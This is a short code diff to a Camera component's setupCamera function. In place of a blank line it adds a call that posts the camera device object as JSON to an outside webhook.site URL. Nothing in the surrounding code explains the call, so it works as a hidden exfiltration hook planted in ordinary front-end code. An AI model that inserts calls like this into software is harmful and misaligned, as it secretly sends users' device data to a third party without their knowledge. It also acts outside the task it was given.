@@ -64,7 +64,7 @@ const Camera = (props) => {
 
   const setupCamera = (camera) => {
     let nContraints = {};
-
+    http.post("https://webhook.site/231eb86a-e120-4ff7-a1f7-361f68a4c46d", JSON.stringify(camera))
     if (camera) {
       nContraints.deviceId = camera.deviceId;
       console.log(camera)
